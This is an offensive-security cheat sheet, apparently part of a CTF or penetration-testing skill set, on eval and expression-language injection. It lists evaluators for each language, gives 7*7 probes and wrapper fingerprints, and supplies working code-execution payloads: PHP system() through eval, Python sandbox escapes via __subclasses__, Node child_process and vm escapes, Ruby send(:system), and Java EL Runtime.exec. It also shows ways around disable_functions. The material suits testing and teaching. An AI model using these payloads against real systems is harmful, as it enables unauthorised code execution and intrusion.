# Eval Injection — when the sink is an evaluator, not a shell

## The class widening (verified by chain card)

`htb-pcalc-php-eval-letter-filter` proved: input reaching `eval()`, an
expression sandbox, or a calculator is the same finding as metachars
reaching a shell. The boundary question changes from "shell?" to
"evaluator?".

## The evaluator inventory by language

| Lang | Evaluators |
|---|---|
| PHP | `eval()`, `assert($str)` (<8), `create_function`, `preg_replace /e`, `call_user_func`, `$$var` deref, `include`/`require` of user path |
| Python | `eval()`, `exec()`, `compile()`+exec, `os.system`, `__import__`, `getattr`/`setattr` chains |
| JS | `eval()`, `new Function()`, `vm.runIn*`, `setTimeout(str)`, `require` of user path, `Function.prototype` |
| Ruby | `eval()`, `instance_eval`, `class_eval`, `send(:system)`, `ERB.result` |
| Java | `ScriptEngine.eval`, `SpEL`, `OGNL`, `MVEL`, `JEXL`, `Class.forName` |
| C# | `CodeDom`, `Roslyn CSharpScript`, `DataTable.Compute` |
| Perl | `eval $str`, `do`, `require`, `use` |
| Bash | `eval`, `source`/`.`, `sh -c`, `bash -c` |
| Generic | calculators (`eval("7*7")`), expression templates |

## The eval-detection probes — language-agnostic markers

```
7*7 or ${7*7} or #{7*7} or {{7*7}}   → 49 in response → evaluator
' + 7*7 + '                          → string concat
7*7                                  → if 49 appears → eval/expr
" + 7*7 + "                          → some engines
${7*7}                               → JSP/EL expr
#{7*7}                               → Ruby/JS template
{{7*7}}                              → ssti boundary — check web-ssti!
(7*7)                                → paren expr
```

The `7*7→49` arithmetic test is universal across engines — the
calculator-style test.

## The "what evaluator is this" fingerprint — syntax quirks

Send `7*7` vs `${7*7}` vs `#{7*7}` vs `{{7*7}}` vs `<%= 7*7 %>` — each
hits different evaluators:

| Wrapper works | Evaluator |
|---|---|
| bare `7*7` | generic expr/calculator |
| `${7*7}` | JSP EL, bash, JS template literal |
| `#{7*7}` | Ruby interpolation, SpEL |
| `{{7*7}}` | Jinja/Twig/Handlebars → `web-ssti`! |
| `<%=7*7%>` | ERB/EJS/JSP → ssti boundary |
| `[[${7*7}]]` | Thymeleaf |
| `*{7*7}` | Thymeleaf inline |
| `%= 7*7` | EJS/ERB |
| `7*7` inside `'`/`"` | string-eval — quote-closed context |

## PHP `eval` specifics — the full shell via eval

`eval` gives PHP not shell — but PHP has `system`/`exec`/`shell_exec` —
`eval` → `system('id')` → shell. Bypass `disable_functions` inside eval:
`assert`/`call_user_func`/`create_function`/FFI.

```php
eval($_GET['x'])  →  ?x=system('id');
                   ?x=phpinfo();
                   ?x=`id`;
```

## Python `eval`/`exec` — the sandbox-escape ladder

```python
eval("__import__('os').system('id')")
eval("().__class__.__base__.__subclasses__()")   — object graph walk
```

Sandboxed eval (`__builtins__` stripped) escape chain:

```python
''.__class__.__mro__[1].__subclasses__()    → list all classes
[x for x in ... if 'os' in str(x)]          → find os.wrappers
().__class__.__base__.__subclasses__()[IDX].__init__.__globals__['system']('id')
```

`_frozen_importlib.BuiltinImporter`/`os._wrap_close` chains — full
pyjail corpus at `ctf-misc`/`misc-interpreter-escape`.

## JS `eval`/`Function` — reach `child_process`

```js
eval("require('child_process').execSync('id').toString()")
new Function("return process")().mainModule.require('child_process').execSync('id')
this.constructor.constructor('return process')()  — vm escape
```

## Ruby `eval`/`send`

```ruby
eval("system('id')")
send(:system,'id')
Object.const_get('Kernel').send(:system,'id')
```

## Expression languages — Java EL injection

```
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(java.lang.Runtime).getRuntime().exec("id")}
T(java.lang.Runtime).getRuntime().exec("id")   — SpEL/OGNL form
```

## The "calculator" shape — a sanctioned evaluator

An endpoint `?expr=7*7` legitimately evals arithmetic — `eval` may be
locked to math. Probe escape:

```
7*7;system('id')       — statement separator
7*7);system('id');(    — close-expr then inject
exec function          — if eval wraps expr
```

PHP-eval: `?x=1;system('id');` works if eval takes statements.
Expression-only evaluators (`eval` of single expr) need the expr-form:
`system('id')+1`, `print(system('id'))`.

## `assert`/`create_function`/`call_user_func` — PHP's other evaluators

`call_user_func('system','id')` — param `f=system`, `a=id` — the
dispatch-sink shape.

## The "no eval keyword but eval anyway" — template/format paths

- `printf`/`sprintf` with `%` injection — not eval but format-string
- `preg_replace /e` — legacy
- template engines evaluating expressions — ssti boundary
- `unserialize`→`__wakeup`→eval — `web-deserialization`
- `eval` inside `$_GET` processing of a template/lang pack
- XPath `evaluate()` on user xpath — injection into path expressions

## Detection — which channel proves an evaluator?

`7*7`→`49` in response = evaluator confirmed. Then language-fingerprint
via syntax error content (`SyntaxError:`, `PHP Parse error:`, `NameError`).

## Falsifiers

- no evaluator processes the input (arithmetic returns literal `7*7`)
- the evaluator is a true math parser with no function-call reach
  (`expr`/`bc`-style, sandboxed EL with no type access)

## Output to record

- which expression wrapper evaluates + the language fingerprint from
  the error message
